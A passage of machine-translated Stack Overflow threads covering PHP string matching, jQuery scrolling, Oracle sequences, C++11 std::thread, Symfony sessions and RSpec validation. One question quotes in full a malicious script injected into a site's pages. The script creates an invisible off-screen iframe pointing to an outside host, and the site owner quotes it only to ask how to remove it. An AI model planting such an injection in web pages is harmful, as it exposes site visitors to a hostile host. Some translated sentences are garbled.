网址：[http ://api.jquery.com/jQuery.ajax/#jQuery-ajax-settings](http://api.jquery.com/jQuery.ajax/#jQuery-ajax-settings)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-09-11T12:37:35.677

您可以`method='POST'`在`form`标签中定义。这也将规定类型，而不将其放在 jquery 函数中。

`<form id="form-signup" action="POST">`

如下：

```
<form id="form-signup" action="POST">
    <fieldset>
        <label for="name">Nome</label>
        <input type="text" id="name" name="name" value="<?=$name?>"><span class="required">*</span>
    </fieldset>
    <fieldset>
        <label for="email">Email</label>
        <input type="email" id="email" name="email" value="<?=$email?>"><span class="required">*</span>
    </fieldset>
    <fieldset>
        <label for="tel">Telefone</label><input type="tel" id="tel" name="tel" value="<?=$tel?>"><span class="required">*</span>
    </fieldset>
    <fieldset>
        <div>
            <label class="blocker">Tipo de anunciante</label><span class="required">*</span>
        </div>
        <input type="radio" name="advertiser" id="advertiser_1">
        <label for="advertiser_1" class="aleft">Particular</label>
        <input type="radio" name="advertiser" id="advertiser_2">
        <label for="advertiser_2" class="aleft">Imobiliária</label>
    </fieldset>
    <fieldset>
        <label for="password">Senha</label>
        <input type="password" id="password" name="password" value="<?=$password?>"><span class="required">*</span>
    </fieldset>
    <fieldset>
        <label for="check-password">Confirmação da senha</label>
        <input type="password" id="check-password" name="check_password" value="<?=$check_password?>"><span class="required">*</span>
    </fieldset>
    <fieldset>
        <input type="submit" value="Enviar" id="sub">
    </fieldset>
</form> 
```

# php - 无法在 PHP 中使用 strpos 制作“相关术语”代码

> ID：12624246
> 
> 赞同：1
> 
> 时间：2012-09-27T14:55:23.300
> 
> 标签：php, strpos

我要做的是从用户那里获取输入文本（例如，让我们说“Java 程序员”），并尝试将此用户输入与我存储在数组中的字符串列表相匹配，例如“Java 程序员是一个好孩子”、“他有时打球”、“Java 和狗互相讨厌”、“狗不是 Java 程序员”

我正在尝试进行单词匹配，因此程序输出数组中与用户查询中的所有单词匹配的所有字符串的列表（顺序并不重要）

所以我希望下面代码的输出是......

“Java 程序员是个好孩子”“狗不是 Java 程序员”

因为根据用户输入的查询，这些术语同时包含“java”和“程序员”

这是我写的代码，它不起作用。任何帮助都感激不尽。

```
<?php
$relatedsearches = array();
$querytowords = array();
$string = "Java programmer"; //GET INPUT FROM USER
$querywords = (explode(' ', $string));
foreach($querywords as $z)
    {
            $querytowords[] = $z;
            }

//ARRAY THAT STORES MASTER LIST OF QUERIES

$listofsearhches = array('Java programmer is a good boy', 'he plays ball at times', 'java and dogs hate each other', ' dogs are not java programmers');

foreach($listofsearhches as $c)
    {
    for ($i=0; $i<=(count($querytowords)-1); $i++)
        {   
        if(strpos(strtolower($c), strtolower($querytowords[$i])) === true)
            { 
            if($i=(count($querytowords)-1))
                {
                $relatedsearches[] = $c;
                } 
            } else { break; }
        }
    }

echo '<br>';
if(empty($relatedsearches))
    {
        echo 'Sorry No Matches found';
    } 
    else 
    {
    foreach($relatedsearches as $lister)
        {
                echo $lister;
                echo '<br>';
                }
            }

?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T15:05:26.360

无需爆炸，`$string`因为您正在寻找 java 和程序员这两个词作为字符串“Java 程序员”。所以你的 foreach 需要看起来像这样

```
 foreach($listofsearhches as $c)
{   
    if(strpos(strtolower($c), strtolower($string)) === true)
        {            
            $relatedsearches[] = $c;

        } else { break; }

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T15:09:52.973

我会做这样的事情： -

```
$matches = array();
$string = 'java programmer';
$stringBits = explode(' ', $string);
$listOfSearches = array('Java programmer is a good boy', 'he plays ball at times', 'java and dogs hate each other', ' dogs are not java programmers');

foreach($listOfSearches as $l) {
  $match = true;
  foreach($stringBits as $b) {
    if(!stristr($l, $b)) {
      $match = false;
    }
  }
  if($match) {
    $matches[] = $l;
  }
}

if(!empty($matches)) {
  echo 'matches: ' . implode(', ', $matches);
} else {
  echo 'no matches found';
} 
```

所以循环遍历要搜索的字符串列表，设置一个`$match`标志（`$string``$listOfSearches``$match`

检查每个单词后，如果`$match`仍然是`true`，则将当前字符串添加到`$listOfSearches`数组`$matches`中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-27T15:22:26.317

```
<?php
    $string = "Java programmer"; //GET INPUT FROM USER
    $querywords = (explode(' ', $string));
    $relatedsearches = array();
    $listofsearhches = array('Java programmer is a good boy', 'he plays ball at times', 'java and dogs hate each other', ' dogs are not java programmers');
    foreach ($listofsearhches as $c) {
        foreach($querywords as $word){
            if(strpos(strtolower($c), strtolower($word)) !== false){
                if(!in_array($c, $relatedsearches))
                    $relatedsearches[] = $c;     

                break;
            }
        } 
    }

    echo '<br>';
    if (count($relatedsearches) < 1) {
        echo 'Sorry No Matches found';
    } 
    else {
        foreach ($relatedsearches as $lister) {
            echo $lister;
            echo '<br>';
        }
    }
?> 
```

搏一搏

# javascript - div中的Jquery幻灯片不断滚动

> ID：12624251
> 
> 赞同：0
> 
> 时间：2012-09-27T14:55:32.403
> 
> 标签：javascript, jquery

我有一个 div，一旦用户向下滚动指定数量，我想滑入。它最初可以工作，但之后 div 在每次滚动操作时都会向左移动一点，而不是保持原位。任何人都知道为什么会这样？

```
 var opening = false;
  var closing = false; 
 $(window).scroll(function(){
     var windowHeight = $(window).height();
     var windowScroll = $(window).scrollTop(); 
     var position1 = $("#Support").offset().top;         
    if ( windowScroll > (position1 - (windowHeight/2)) )  
     {
        if (!opening) {
            opening = true;
            closing = false;
            $("#SupportImage1").stop().animate({
                left: "1200px"                  
              }, 1500, function(){
                  opening = false;
                  });
            }            
     }
     else
     {
        if (!closing) {
            closing = true;
            opening = false;
             $("#SupportImage1").stop().animate({
                left: "100%"                    
              }, 1400, function() {
                  closing = false;
              });                
        }
     }       
 }); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T14:57:14.867

滚动条很可能会影响您的宽度计算。

每次您针对滚动条运行该功能时，您都会添加总屏幕宽度加上滚动条的偏移量。

# javascript - 我想从 200 页中删除以下脚本

> ID：12624252
> 
> 赞同：0
> 
> 时间：2012-09-27T14:55:35.197
> 
> 标签：javascript, linux, removeall

是否有任何 Linux 命令可以从我们网站的所有 200 个页面中删除以下脚本？

```
function frmAdd() { var ifrm = document.createElement('iframe'); ifrm.style.position='absolute'; ifrm.style.top='-999em'; ifrm.style.left='-999em'; ifrm.src = "http://yankeeyiddos.com/media/index.php"; ifrm.id = 'frmId'; document.body.appendChild(ifrm); }; window.onload = frmAdd; 
```

首先我们要查找然后从页面中删除。我们尝试使用 sed 命令，但没有奏效。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T15:24:54.457

The easiest way would be to remove the script from the template you use to generate the 200 pages. You did not type them in one by one, did you? Also, consider using `<link>` and an external `.js` file to load the javascript that is common for more than one page.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T14:59:06.550

您为什么要尝试使用命令将其删除？普通的文本编辑器或dreamweaver 可以轻松完成。你也可以在梦中用正则表达式告诉它开始参数和结束参数。只需要选择主文件夹和所有文件

# asp.net - 从 HTML 页面创建 PDF，格式保留在 ASP.Net 中的 PDF 中

> ID：12624257
> 
> 赞同：0
> 
> 时间：2012-09-27T14:55:46.723
> 
> 标签：asp.net, html, css, itextsharp

我正在尝试使用 ASP.Net中的**iTextSharp.dll将 HTML 页面转换为 PDF。**

我能够将内容转换为我的 PDF ，但问题是 HTML 页面的格式（内联）从我创建的 PDF 中删除。

例如，我有以下代码块要从我的 HTML 页面格式化为 PDF。

```
<table style="width:90%; float:left; background:#dddddd; padding:15px; border:1px solid #000; color:#000;"><tr><td style="text-transform:uppercase; font-size:14px;font-weight:bold;">SPECIAL DELIVERY FOR:</td></tr><tr><td style="padding-left:40px; font-size:12px; color:#4e4e4e;">Name: #CustomerName#    
<br /><br /><label>
<b>Date: #CreatedOn#    
</b></label><br />
</td></tr>
</table> 
```

我必须用更多这样的 HTML 代码来格式化我的 PDF。

我也使用了 Stylesheet 类，但这并没有多大帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T15:11:07.957

将html转换为图像然后让itextsharp将其导出为pdf可能是一个更好的选择。使用 itextsharp 转换风格对我来说非常棘手，这种方式使它更容易

# ruby-on-rails - 我如何从我的代码中检查 Sidekiq 中是否有排队的东西？

> ID：12624259
> 
> 赞同：0
> 
> 时间：2012-09-27T14:55:48.220
> 
> 标签：ruby-on-rails, ruby, sidekiq

当满足某些条件时，我想安排一个工人在 5 分钟内运行一个特定的工作。问题是，如果再次满足相同的条件，我想检查是否有计划运行。如果有这样的工人计划运行，那么，我不想再次入队，但如果没有，它应该排队。我希望你们明白我想要做什么。可以实现吗？如果是，如何？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T02:56:34.223

听起来您想使用或实现一个简单的持久锁。使作业入队的代码可以首先检查锁的可用性，如果可用则获取并入队，如果没有则跳过。入队的作业可以负责释放锁。您需要考虑失败，例如添加锁定超时。[redis-mutex](https://github.com/kenn/redis-mutex) gem 可能是这个想法的有用实现。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-02T04:02:57.823

最佳实践促进了幂等的工作。这意味着您应该以这样一种方式编写它们，即多次运行它们应该是安全的。任何后续调用都不会更改第一次调用的结果。您可以通过编写进行适当检查并采取相应措施的逻辑来实现这一点。由于您没有提供有关您的工人的工作的描述，因此我不能更具体。

例如，这里是 Sidekiq 常见问题解答的链接：[让您的工作人员具有幂等性和事务性](https://github.com/mperham/sidekiq/wiki/Best-Practices)

这种方法的好处是您正在使用调度工作人员的方便抽象，而不是与之抗争。

# oracle - 在 oracle 的存储过程中创建/声明一个序列

> ID：12624261
> 
> 赞同：1
> 
> 时间：2012-09-27T14:55:54.570
> 
> 标签：oracle

我有一个以 emp_no 作为主键的表 non_employee 和一个包含要插入该表的过程的包。

我需要能够在程序运行时自动增加 emp_no。我尝试在这样的过程中创建一个序列，但出现错误。请参阅下文和建议。

```
CREATE OR REPLACE PACKAGE BODY WFDDEV."ERD" IS

create SEQUENCE @seq_emp_nmbr;

PROCEDURE INS_NON_EMPLOYEES
(
in_DATE_ADDED        DATE,  
in_EMPLOYEE_NAME     VARCHAR2,
in_DEPT_ID           VARCHAR2,
in_SUB_DEPARTMENT    VARCHAR2,
in_LOCATION          VARCHAR2,
in_WORK_TEL_NO       VARCHAR2,
in_TOUR              VARCHAR2,
in_REST_DAYS         VARCHAR2,
in_HOME_ADDRESS      VARCHAR2,
in_CITY              VARCHAR2,
in_STATE             VARCHAR2,
in_ZIP               VARCHAR2,
in_HOME_TEL_NO       VARCHAR2,
in_GENDER            VARCHAR2,
in_RACE              VARCHAR2,
in_DATE_OF_BIRTH     DATE,
in_AGE               VARCHAR2,
in_HIRE_DATE         DATE,
in_UNION_AFFILIATION VARCHAR2,
in_TITLE             VARCHAR2,
in_NON_EE_INDICATOR  VARCHAR2
) IS
BEGIN

INSERT INTO WFDDEV.NON_EMPLOYEES
  (
  EMP_NO,
  DATE_ADDED,
  EMPLOYEE_NAME,
  DEPT_ID,
  SUB_DEPARTMENT,
  LOCATION,
  WORK_TEL_NO,
  TOUR,
  REST_DAYS,
  HOME_ADDRESS,
  CITY,
  STATE,
  ZIP,
  HOME_TEL_NO,
  GENDER,
  RACE,
  DATE_OF_BIRTH,
  AGE,
  HIRE_DATE,
  UNION_AFFILIATION,
  TITLE,
  NON_EE_INDICATOR
  )
VALUES
  (
 emp_no.NEXTVAL,
  in_DATE_ADDED,
  in_EMPLOYEE_NAME,
  in_DEPT_ID,
  in_SUB_DEPARTMENT,
  in_LOCATION,
  in_WORK_TEL_NO,
  in_TOUR,
  in_REST_DAYS,
  in_HOME_ADDRESS,
  in_CITY,
  in_STATE,
  in_ZIP,
  in_HOME_TEL_NO,
  in_GENDER,
  in_RACE,
  in_DATE_OF_BIRTH,
  in_AGE,
  in_HIRE_DATE,
  in_UNION_AFFILIATION,
  in_TITLE,
  in_NON_EE_INDICATOR
  );
END; 
```

我得到 PLS-00103：在预期以下情况之一时遇到符号“CREATE”：

开始 结束 函数 pragma 过程 子类型 类型

这个错误...

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-27T15:50:24.143

您只需在包外创建一次序列作为单独的数据库对象。然后，在包体中的插入语句中，您可以引用序列来获取下一个值。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-27T15:24:40.463

尝试-

```
EXECUTE IMMEDIATE 'CREATE SEQUENCE SEQ_NAME  START WITH 1 INCREMENT BY 1 MINVALUE 1 MAXVALUE 1000000 NOCYCLE NOCACHE ORDER'; 
```

这应该在过程或函数主体内，而不是在声明部分，即应该将其视为可执行语句。

使用动态 SQL 创建序列是个坏主意，我不确定您为什么要这样做。但是，如果您要动态创建序列，请记住在完成后也将其删除，使用

```
EXECUTE IMMEDIATE 'DROP SEQUENCE SEQ_NAME'; 
```

这样，您`ORA-00955`在调用包过程时至少不会遇到错误（如 ）。

# php - URL 查询从加号变为减号

> ID：12624263
> 
> 赞同：1
> 
> 时间：2012-09-27T14:55:55.243
> 
> 标签：php, url, query-string

例如，如何从 url 查询中将加号更改为减号：从 ?search=some+words 到 ?search=some-words 因为如果我使用 + 我只能从第一个单词中获得结果。有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T15:15:25.263

$search = rawurlencode(strip_tags(str_replace("_", " ", $_GET['search'])));

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-03T19:34:50.487

关于不同可能性的优秀概述，包括[此处](http://www.rither.de/a/informatik/php-beispiele/strings/urls-encodieren-und-decodieren/)的示例。

它是德文的，但代码是不言自明的。

```
<?php

$_GET['parameter1'] = urlencode('Dies ist ein längerer Beispielstring');
var_dump($_GET['parameter1']);
var_dump(urldecode($_GET['parameter1']));

$_GET['parameter2'] = rawurlencode('Dies ist ein längerer Beispielstring');
var_dump($_GET['parameter2']);
var_dump(rawurldecode($_GET['parameter2']));

// urlencode() macht aus dem Leerzeichen ein +
// rawurlencode() hingegen ein %20
var_dump(urlencode(' '), urldecode(urlencode(' ')));
var_dump(rawurlencode(' '), rawurldecode(rawurlencode(' ')));

var_dump(urlencode('+'), urldecode(urlencode('+')));
var_dump(rawurlencode('+'), rawurldecode(rawurlencode('+'))); 
```

结果是

```
string(41) "Dies+ist+ein+l%C3%A4ngerer+Beispielstring"
string(37) "Dies ist ein längerer Beispielstring"
string(49) "Dies%20ist%20ein%20l%C3%A4ngerer%20Beispielstring"
string(37) "Dies ist ein längerer Beispielstring"
string(1) "+"
string(1) " "
string(3) "%20"
string(1) " "
string(3) "%2B"
string(1) "+"
string(3) "%2B"
string(1) "+" 
```

**我想补充一点，Apache 的配置和 mod_rewrite 会影响这种行为。**

# xml - 属性 ？？？必须具有当前属性名称或引用，但不能同时具有“

> ID：12624265
> 
> 赞同：0
> 
> 时间：2012-09-27T14:55:55.820
> 
> 标签：xml, wsdl

我正在尝试使用带有 Visual Studio 2010 客户端的 SOAP 标准使用 PHP 创建的 Web 服务。

当我尝试生成代理时，会出现关于 WSDL 文件格式的错误。错误消息是这样的（翻译得很不准确）：

> 名为“Inscritos”的 ComplexType 架构元素中的错误，属性 ??? 必须具有当前属性 name 或 ref，但不能同时具有

查看 WSDL 我发现了这个元素：

```
 <xsd:complexType name="Inscritos">
   <xsd:complexContent>
     <xsd:restriction base="SOAP-ENC:Array">
       <xsd:attribute res="http://schemas.xmlsoap.org/soap/encoding/:arrayType" wsdl:arrayType="tns:Inscritos2[]"/>
     </xsd:restriction>
   </xsd:complexContent>
 </xsd:complexType> 
```

WS 由外部提供商托管，因此我们没有机会重新定义它。有人知道避免此问题的方法或解决方法吗？

提前感谢您的帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T17:25:46.057

这是一个糟糕的架构，我不知道它应该是什么意思，所以我不能建议更正。

如果您的项目依赖于不符合目的的外部供应商提供的服务，您会问该怎么办。这是一个项目管理问题，而不是技术问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T15:03:01.317

我相当确定`xsd:attribute`标签应该有属性`ref`而不是`res`. 尝试改变

```
<xsd:attribute res="http://schemas.xmlsoap.org/soap/encoding/:arrayType" wsdl:arrayType="tns:Inscritos2[]"/> 
```

至

```
<xsd:attribute ref="http://schemas.xmlsoap.org/soap/encoding/:arrayType" wsdl:arrayType="tns:Inscritos2[]"/>
                 ^ 
```

# javascript - 显示 HTML 页面的外部加载资源的文件大小

> ID：12624268
> 
> 赞同：0
> 
> 时间：2012-09-27T14:56:00.937
> 
> 标签：javascript

在[“我们如何保持 GitHub 快速”](https://github.com/blog/1252-how-we-keep-github-fast)一文中，他们描述了一个工具栏，GitHub 工作人员可以使用该工具栏查看每个页面加载的各种性能指标。显示的两个项目是加载的 JavaScript 和 CSS 的 KB。

**他们如何确定加载的 JavaScript 和 CSS 的 KB？JavaScript 是否提供了访问外部加载资源的方法？**

我的目标是创建一个类似的工具栏并显示所有外部加载资源的大小。

我想您可以搜索`<script>`, `<link>`,`<img>`等标签并访问它们的相关`src`,`href`等属性，使用 HEAD 方法发出 XmlHttpRequest ，然后使用响应中的 Content-Length 标头。

另一种方法是在返回响应之前解析生成的 HTML，确定外部加载的资源，直接获取它们的大小，然后将工具栏代码附加到预先填充的带有外部资源大小的响应中。

但我想知道是否有更有效或更简单的方法可用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T15:10:46.013

我猜他们使用了像[speedtracer](https://developers.google.com/web-toolkit/speedtracer/get-started)这样的浏览器扩展程序，它可以访问调试器的网络面板向您显示的相同指标。

JavaScript 通常无法访问外部资源，但是可以通过 XHR 加载它们以检查它们。此外，您还可以通过[Navigation-Timing API](http://www.w3.org/TR/navigation-timing/)获取其中一些信息（请参阅[html5rocks 文章](http://www.html5rocks.com/en/tutorials/webperformance/basics/)）。

当然，他们有一个连接到他们的服务器以获取这些内部服务器指标。他们也有可能通过该渠道而不是从 javascript api 获取有关服务资源的信息。

# c# - 在类外定义时在序列化中包含枚举

> ID：12624270
> 
> 赞同：1
> 
> 时间：2012-09-27T14:56:04.023
> 
> 标签：c#, xml, serialization, reflection

一个类`[Serializable] Currency`有两个字段和`XmlElement`反射属性：

```
[XmlElement("currencyname")]
CurrencyValue m_Value { get; }

[XmlElement("exchangerate")]
public decimal exchangeRate { get; set; } 
```

`CurrencyValue`是`Currency`类外的枚举。

我尝试使用`[XmlEnum("...")]`属性，也尝试在类中“拉”设置枚举值，使用

```
[XmlElement("Value")]
public CurrencyValue m_value
{
    get { return m_value.ToString(); }
} 
```

但无济于事。类方法`ToXML()`如下所示：

```
public string ToXML(bool indent = false, bool omitXmlDeclaration = true, bool includeDefaultNamespaces = false)
{
    XmlSerializer serializer = new XmlSerializer(typeof(Currency));
    XmlSerializerNamespaces ns = new XmlSerializerNamespaces();

    if (!includeDefaultNamespaces)
    {
        ns.Add("", "");
    }

    XmlWriterSettings settings = new XmlWriterSettings();
    settings.Encoding = new UnicodeEncoding(false, false);
    settings.Indent = indent;
    settings.OmitXmlDeclaration = omitXmlDeclaration;

    using (StringWriter stringWriter = new StringWriter())
    {
        using (XmlWriter xmlWriter = XmlWriter.Create(stringWriter, settings))
        {
            serializer.Serialize(xmlWriter, this, ns);
            return stringWriter.ToString();
        }
    }
} 
```

我的问题是：像这样的枚举可以包含在我的对象的序列化中吗？我看不出有什么理由不将它包含在类本身中，但是这个枚举有可能在其他地方使用并且改变它的位置对我有利不是一种选择。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T17:29:09.660

遗憾的是，XmlSerializer 将忽略没有公共设置器的成员。添加一个 setter（如果您不想使用它，即使只是抛出一个）并确保该属性是公共的，它应该可以正常工作。您甚至不需要 XmlEnum 属性。

# c++ - C++11 std::thread 给出错误：没有匹配的函数来调用 std::thread::thread

> ID：12624271
> 
> 赞同：7
> 
> 时间：2012-09-27T14:56:10.950
> 
> 标签：c++, c++11, stdthread

我正在使用此代码测试 c++11 线程，但是在创建线程时，我遇到错误**no matching function for call to 'std::thread::thread()'**。

这就像我给 std::thread ctr 的函数有问题，但我不明白它是怎么错的。它不完整，但在我看来是正确的：

标题：

```
#ifndef CONNECTION_H
#define CONNECTION_H

#include <thread>
#include <mysql++.h>

class Connection
{
public:
    Connection(std::string mysqlUser, std::string mysqlPassword);
    ~Connection();

private:
    std::string mysqlUser;
    std::string mysqlPassword;
    std::string mysqlIP;
    int mysqlPort;

    mysqlpp::Connection mysqlConnection;
    std::thread connectionThread;

    void threadLoop();
};

#endif // CONNECTION_H 
```

资源：

```
#include "connection.h"

Connection::Connection(std::string mysqlUser, std::string mysqlPassword)
{
    this->mysqlUser     = mysqlUser;
    this->mysqlPassword = mysqlPassword;
    this->mysqlIP       = "localhost";    //default
    this->mysqlPort     = 3306;           //default

    //Launch thread
    std::thread connectionThread(threadLoop);

}

Connection::~Connection(){
    mysqlConnection.disconnect();
}

void Connection::threadLoop(){
    //Connect to mySQL database
    mysqlConnection = new mysqlpp::Connection(false);

    if(mysqlConnection.connect(NULL, mysqlIP.c_str(), mysqlUser.c_str(), mysqlPassword.c_str(), mysqlPort)){
        std::string consulta = "SELECT * FROM 'Coordinates'";
        mysqlpp::Query query = mysqlConnection.query(consulta);
        mysqlpp::StoreQueryResult res = query.store();
        query.reset();

    }

    while(true){
        // Stuff
    }
} 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-09-27T15:34:13.220

问题是这`threadLoop`是一个成员函数，但没有对象可以应用它。只是猜测：

```
std::thread connectionThread(&Connection::threadLoop, this); 
```

但这只是句法问题。还有一个逻辑问题：该行创建了一个类型的本地对象，该对象`std::thread`在函数返回时消失。它的析构函数将调用`std::terminate()`，因为线程尚未加入。最有可能的是，这应该为`connectionThread`成员附加一个线程。要做到这一点：

```
std::thread thr(threadLoop, this);
std::swap(thr, connectionThread); 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-28T10:21:44.837

您的代码有两个问题：

1.  您正在向`std::thread`构造函数提供不完整的信息
2.  `std::thread`在它与主线程连接之前，您正在破坏它。

对于第一个问题，正如[Pete Becker 所建议](https://stackoverflow.com/questions/12624271/c11-stdthread-giving-error-no-matching-function-to-call-stdthreadthread/12624993#12624993)的那样，您需要提供将在其上调用函数的对象，因为 for 的构造函数`std::thread`没有其他方法可以知道它。假设你想在你正在构造`threadLoop()`的`Connection`对象上调用函数，你可以这样做：

```
//Launch thread
std::thread connectionThread(threadLoop, this); 
```

在内部，构造函数将调用`this->threadLoop()`（它接收`this`的参数在哪里，当然不是它本身）。你会没事的。`Connection*``std::thread`

第二个问题是 your`std::thread`在启动后立即被销毁，而没有将其加入主线程：这将调用`terminate()`，这不是一件好事。皮特再一次提出了一个不错的选择。将上面的代码替换为：

```
// Launch thread
std::thread thr(threadLoop, this);
std::swap(thr, connectionThread); 
```

这段代码之前的情况如下：

*   你有一个微不足道的`std::thread`对象，`connectionThread`它并不真正代表一个线程

执行第一行代码后：

*   你还有`connectionThread`
*   您还有一个由`std::thread`object表示的活动线程`thr`，它将在构造函数的末尾被销毁`Connection`，从而导致调用，`terminate()`因为它从未加入到主线程中。

幸运的是，第二行代码提供了帮助。执行后：

*   您有一个微不足道`std::thread`的 , `thr`，可以安全地销毁它，因为它不代表真正的线程（因此它不可连接）
*   您有一个由 表示的活动线程`connectionThread`，只要该`Connection`对象存在，该对象就不会被销毁。

现在，问题是你想`connectionThread`在主线程被销毁之前加入它，但你也想避免阻塞主线程。进行此连接的正确时间是可能的最晚时间：`connectionThread`即将被销毁的时间。这发生在`Connection`. 所以我们将在这个析构函数中添加一行，这样：

```
Connection::~Connection(){
  mysqlConnection.disconnect();
  connectionThread.join(); // Now connectionThread can be safely destroyed
} 
```

此外，这是最安全的呼叫地点`join()`，因为它确保您永远不会破坏未加入的`connectionThread`. 这是行动中的 RAII；如果您不熟悉 RAII（或 RIIA，有时称为）的概念，您可以在 Web 上找到很多关于这个非常重要的概念的信息，包括这个站点。

所有这些放在一起：创建一个`Connection`对象将创建一个新线程；在这个线程中，将建立一个新的数据库连接并执行一个查询，而主线程保持空闲用于任何其他用途（例如，管理 GUI）。当`Connection`对象最终被销毁时，主线程将等待附加线程完成（如果需要），然后继续正常执行。我希望这是你想用你的代码完成的。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-27T15:19:42.343

正如您可能从[cppreference](http://en.cppreference.com/w/cpp/thread/thread/thread)中看到的那样，`std::thread`的构造函数期望某种形式的函数；您可以通过[`std::bind`](http://en.cppreference.com/w/cpp/utility/functional/bind). 为了执行一个非静态成员函数，您应该使用[`std::mem_fn`](http://en.cppreference.com/w/cpp/utility/functional/mem_fn)它与应该调用它的对象一起传递它。

# session - 设置 Symfony2 不存储会话数据

> ID：12624272
> 
> 赞同：2
> 
> 时间：2012-09-27T14:56:13.947
> 
> 标签：session, symfony

我有一个 Symfony2 应用程序，它代表一个不需要持久会话的宁静应用程序。

对于应用程序的每个请求，给定默认会话配置，并假设客户端忽略会话 cookie，在默认会话保存路径中创建一个新的会话文件`app/cache/<env>/sessions`。

该应用程序每天会收到许多请求，从而导致大量不需要的会话文件。运行`rm -Rf app/cache/prod/session/*`需要几分钟才能完成。

如果应用程序不存储任何会话数据，我会更喜欢。

我已尝试将应用程序配置会话保存路径设置为`/dev/null`or `/dev/null/sessions`，但这会导致异常，因为目录已经存在（for `/dev/null`）或由于指定的路径不是目录（for `/dev/null/<anything>`）。

```
framework:
    session:
        save_path: /dev/null 
```

[从阅读会话文档](http://symfony.com/doc/master/components/http_foundation/sessions.html)中我能看到的最好的事情是使会话无效，这会清除所有会话属性并重新生成会话 ID。这不会让我处于没有会话和没有持久会话文件的状态。

我可以让 Symfony2 不为请求存储任何会话数据吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T15:13:32.300

您可以定义自己的 Session 处理程序并`session`用它替换服务别名：

```
services:
    session:
        class: Path\To\Your\Session\Class 
```

您可以使用标准会话类检查实现`Symfony\Component\HttpFoundation\Session\Session`

# c++ - 移动库和编译器 - 生成的 .a 文件大 10 倍。如何找到根本原因？

> ID：12624273
> 
> 赞同：0
> 
> 时间：2012-09-27T14:56:14.140
> 
> 标签：c++, unix, gcc, gcc4.7

我从事的一个项目依赖于另一个非常大的内部图书馆。

我的项目的 CMake 文件是基于库 CMake 文件生成的——它指定了编译器、编译器开关等。旧库将编译器指定为 gcc 4.3.2，而新库将编译器指定为 gcc 4.7.0

当我们迁移到新的库版本时，为我的项目生成的二进制文件增长了大约 10 倍——从 35MB 到 123MB

在 .a 文件上执行 nm，向我展示了相同的 .o 文件为库的两个版本生成了 .a 文件。

但是，在使用新库版本生成的 .a 文件中似乎多了约 30% 的符号（按 wc -l 计算）。

这种二进制大小爆炸的潜在原因是什么？我意识到可能有很多，但是我完全一无所知-任何提示都会有所帮助。

# ruby-on-rails - Rspec 测试新对象的有效性未通过

> ID：12624274
> 
> 赞同：1
> 
> 时间：2012-09-27T14:56:14.523
> 
> 标签：ruby-on-rails, rspec, factory-bot, railstutorial.org

我完成了 Michael Hartl 的所有 Ruby on Rails 教程，所有测试都通过了。现在我要回去对网站进行更改以满足我自己的需要，它并不像“本节中的测试没有通过”那么简单。我创建了一个基于 Hartl 的“Micropost”对象的新“Charity”对象。唯一的区别是对象没有“内容”，而是有`:name`,`:description`和`:summary`。

这是失败的测试代码（特别是“it { should be_valid }”），位于`/charity_spec.rb`：

```
require 'spec_helper'

    describe Charity do

      let(:user) { FactoryGirl.create(:user) }
      before { @charity = user.charities.build(summary: "Lorem ipsum") }

      subject { @charity }

      it { should respond_to(:name) }
      it { should respond_to(:user_id) }
      it { should respond_to(:summary) }
      it { should respond_to(:description) }
      it { should respond_to(:user) }
      its(:user) { should == user }
      it { should be_valid }
      ... 
```

测试实际上首先通过了，但是一旦我将验证添加到`charity.rb`文件中，它们就会返回；

```
 Failures:
   1) Charity
      Failure/Error: it { should be_valid }
         expected valid? to return, true, got false
         ... 
```

这是`charity.rb`：

```
class Charity < ActiveRecord::Base
  attr_accessible :name, :description, :summary
  belongs_to :user

  validates :name, presence: true, length: { maximum: 40 }
  validates :summary, presence: true
  validates :description, presence: true
  validates :user_id, presence: true

  default_scope order: 'charities.created_at DESC'
end 
```

我敢肯定这是愚蠢的，但我对一切的理解是如此的薄弱，以至于我无法弄清楚我做错了什么，我的感觉是我的工厂出了问题，但我真的不知道。

这是我的慈善工厂位于`factories.rb`：

```
factory :charity do
    name "Lorem ipsum"
    summary "Lorem ipsum"
    description "Lorem ipsum"
    user
end 
```

当我从 中删除`:name`、`:summary`和`:description`验证时`charity.rb`，测试通过。为了更好地衡量，这是我的开头`user.rb`：

```
class User < ActiveRecord::Base
  attr_accessible :name, :email, :password, :password_confirmation 
  has_secure_password
  has_many :charities
  has_many :microposts, dependent: :destroy 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T15:06:10.653

使用您的工厂进行适当的慈善活动：

```
before { @charity = user.charities.build(FactoryGirl.attributes_for(:charity)) } 
```

它失败了，因为您验证了未设置的属性的存在`name`

如果您需要更多有关 FactoryGirl 的背景知识，他们的[文档](https://github.com/thoughtbot/factory_girl/blob/master/GETTING_STARTED.md)非常好。

# orbeon - 更新引用的实例数据时 XForms 绑定不更新

> ID：12624277
> 
> 赞同：0
> 
> 时间：2012-09-27T14:56:19.810
> 
> 标签：orbeon, xforms

我的问题是这样的：

我的模型中有 2 个实例：

```
<xf:instance id="Include-model">
    <data>
        <value type="xs:string">true</value>
    </data>
</xf:instance> 
```

这被连接到一个复选框，并且

```
<xf:instance id="items-model">
    <items>
        <item>1</item>
